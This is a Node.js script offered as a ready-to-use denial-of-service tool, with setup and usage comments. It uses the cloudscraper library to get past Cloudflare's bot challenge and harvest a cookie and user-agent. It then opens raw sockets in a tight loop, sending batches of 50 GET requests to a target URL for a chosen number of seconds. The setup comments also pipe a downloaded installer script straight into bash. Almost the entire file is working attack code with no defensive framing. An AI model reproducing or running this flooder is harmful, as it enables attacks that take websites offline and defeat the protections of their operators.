// 1. curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.34.0/install.sh | bash
// 2. close terminal then open again
// 3. nvm install node
// 4. nvm install 6.14.4
// 5. npm install cloudscraper
// 6. npm install randomstring
// 7. npm install request --save
// EXAMPLES. node CFSocket.js [LINK] [TIME]
// EXAMPLES. node CFSockets.js https://example.com/ 100
// EXAMPLES. node CFBypass.js [LINK] [TIME]
// EXAMPLES. node CFBypass.js https://example.com/ 100
 
const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
 
var cloudscraper = require('cloudscraper');
const url = require('url');
if (process.argv.length <= 2) {
	console.log("Usage: node CFSockets.js <url> <time>");
	console.log("Usage: node CFSockets.js <http://example.com> <60>");
	process.exit(-1);
}
var target = process.argv[2];
var time = process.argv[3];
var cookie = "";
var ua = "";
var host = url.parse(target).host;
var cookie = "";
cloudscraper.get(target, function (error, response) {
	if (error) {
	} else {
		var parsed = JSON.parse(JSON.stringify(response));
		cookie = (parsed["request"]["headers"]["cookie"]);
		if (cookie == undefined) {
			cookie = (parsed["headers"]["set-cookie"]);
		}
		ua = (parsed["request"]["headers"]["User-Agent"]);
	}
	console.log('Received tokens!')
	console.log(cookie + '/' + ua);
});
var counter = 0;
 
var int = setInterval(() => {
	if (cookie !== '' && ua !== '') {
		var s = require('net').Socket();
		s.connect(80, host);
		s.setTimeout(10000);
		for (var i = 0; i < 50; i++) {
			s.write('GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		}
		s.on('data', function () {
			setTimeout(function () {
				s.destroy();
				return delete s;
			}, 5000);
		})
	}
});
setTimeout(() => clearInterval(int), time * 1000);
 
// to not crash on errors
process.on('uncaughtException', function (err) {
	console.log(err);
});
 
process.on('unhandledRejection', function (err) {
	console.log(err);
});